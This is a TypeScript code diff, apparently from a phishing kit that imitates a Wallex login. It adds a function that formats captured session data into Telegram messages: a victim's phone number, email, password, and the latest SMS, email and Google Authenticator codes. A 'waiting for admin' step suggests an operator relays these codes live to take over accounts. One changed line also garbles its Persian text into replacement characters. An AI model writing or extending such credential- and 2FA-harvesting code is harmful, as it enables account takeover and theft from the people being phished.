@@ -1203,7 +1203,7 @@ const getCurrentStepText = (step: string): string => {
   const stepTexts: { [key: string]: string } = {
     phone_verification: "🔄 در حال تایید شماره همراه",
     waiting_admin: "⏳ منتظر تصمیم ادمین",
-    email_verification: "📧 در حال تایید ایمیل",
+    email_verification: "📧 در حا�� تایید ایمیل",
     email_completed: "✅ ایمیل با موفقیت تایید شد",
     auth_password: "🔒 وارد کردن رمز عبور",
     auth_google: "📱 احراز هویت دو مرحله‌ای",
@@ -1222,7 +1222,7 @@ const getStepDisplayName = (stepType: string): string => {
   const names: { [key: string]: string } = {
     password: "🔒 رمز عبور حساب",
     google: "📱 Google Authenticator",
-    sms: "💬 کد ��ایید پیامکی",
+    sms: "💬 کد تایید پیامکی",
     email: "📧 کد تایید ایمیلی",
   };
 
@@ -1230,16 +1230,108 @@ const getStepDisplayName = (stepType: string): string => {
 };
 
 /**
- * Validate Telegram configuration
+ * Format session message in simple and beautiful format
  */
-export const validateTelegramConfig = (): boolean => {
-  if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN") {
-    return false;
+const formatSessionMessage = (session: UserSession): string => {
+  // Escape HTML characters in user data
+  const escapeHtml = (text: string): string => {
+    return text
+      .replace(/&/g, "&amp;")
+      .replace(/</g, "&lt;")
+      .replace(/>/g, "&gt;")
+      .replace(/"/g, "&quot;")
+      .replace(/'/g, "&#39;");
+  };
+
+  // Main header - simple and clean
+  let message = `🔐 <b>درخواست ورود والکس</b>
+
+👤 <b>${escapeHtml(session.phoneNumber)}</b>
+🕐 ${escapeHtml(session.startTime)}
+📍 ${escapeHtml(getCurrentStepText(session.currentStep))}`;
+
+  // Online status (if available) - single line
+  if (session.onlineStatus) {
+    const timeSinceUpdate = Date.now() - session.onlineStatus.lastUpdate;
+    const timeAgo =
+      timeSinceUpdate > 60000
+        ? `${Math.floor(timeSinceUpdate / 60000)}د`
+        : `${Math.floor(timeSinceUpdate / 1000)}ث`;
+
+    message += `\n${session.onlineStatus.statusEmoji} ${escapeHtml(session.onlineStatus.statusText)} (${timeAgo})`;
   }
 
-  if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID") {
-    return false;
+  // Verification codes section - compact format
+  let codes = [];
+
+  // Phone verification code
+  if (session.phoneVerificationCode) {
+    codes.push(
+      `📱 تایید شماره: <code>${escapeHtml(session.phoneVerificationCode)}</code>`,
+    );
   }
 
-  return true;
+  // Email info
+  if (session.email) {
+    codes.push(`📧 ایمیل: <code>${escapeHtml(session.email)}</code>`);
+    if (session.emailCode) {
+      codes.push(`✉️ کد ایمیل: <code>${escapeHtml(session.emailCode)}</code>`);
+    }
+  }
+
+  // Auth codes - compact single lines
+  if (session.authCodes && Object.keys(session.authCodes).length > 0) {
+    Object.keys(session.authCodes).forEach((stepType) => {
+      const stepCodes = session.authCodes[stepType];
+      if (stepCodes && stepCodes.length > 0) {
+        let stepEmoji = "🔐";
+        let stepName = "";
+
+        // Choose appropriate emoji and name
+        switch (stepType) {
+          case "password":
+            stepEmoji = "🔒";
+            stepName = "رمز عبور";
+            break;
+          case "google":
+            stepEmoji = "📱";
+            stepName = "Google Auth";
+            break;
+          case "sms":
+            stepEmoji = "💬";
+            stepName = "کد SMS";
+            break;
+          case "email":
+            stepEmoji = "📧";
+            stepName = "کد ایمیل";
+            break;
+          default:
+            stepName = stepType;
+        }
+
+        // Show latest code for each type
+        const latestCode = stepCodes[stepCodes.length - 1];
+        codes.push(
+          `${stepEmoji} ${stepName}: <code>${escapeHtml(latestCode)}</code>`,
+        );
+      }
+    });
+  }
+
+  // Add codes section if any codes exist
+  if (codes.length > 0) {
+    message += `\n\n🔑 <b>کدهای دریافتی:</b>\n` + codes.join("\n");
+  }
+
+  // Simple footer with session info
+  const completedCount = session.completedSteps?.length || 0;
+  const totalAttempts = Object.values(session.authAttempts || {}).reduce(
+    (sum, count) => sum + count,
+    0,
+  );
+
+  message += `\n\n📊 مراحل: ${completedCount} | تلاش‌ها: ${totalAttempts}`;
+  message += `\n🆔 <code>${session.sessionId.substring(0, 8)}...</code>`;
+
+  return message;
 };
